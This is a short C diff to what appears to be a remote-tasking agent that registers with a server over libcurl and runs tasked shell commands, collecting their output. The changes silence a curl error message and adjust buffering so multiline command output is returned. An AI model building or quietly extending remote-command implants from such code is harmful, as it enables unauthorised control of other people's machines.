@@ -85,7 +85,7 @@ bool reg(struct agent_info *agent, struct strings_array *sa)
 	// Check for errors
 	if (web.res != CURLE_OK)
 	{
-		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
+		// fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
 		return false;
 	}
 
@@ -301,7 +301,9 @@ bool exec_cmd(struct tasks *task)
 	{
 		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
 		{
-			size_t buf_len = strlen(line) +1;
+			// adding strlen(line) + 1 made this work for single line command responses.
+			// however adding strlen + 1 makes it so multiline respones dont work
+			size_t buf_len = strlen(line);
 			tmp_space = realloc(task->results, buf_len + cur_len + 1);
 			if (!tmp_space)
 			{
@@ -311,7 +313,7 @@ bool exec_cmd(struct tasks *task)
 				return false;
 			}
 			task->results = tmp_space;
-			strncpy(task->results + cur_len, line, buf_len);
+			strncpy(task->results + cur_len, line, buf_len + 1);
 			cur_len += buf_len;
 		}
 	}
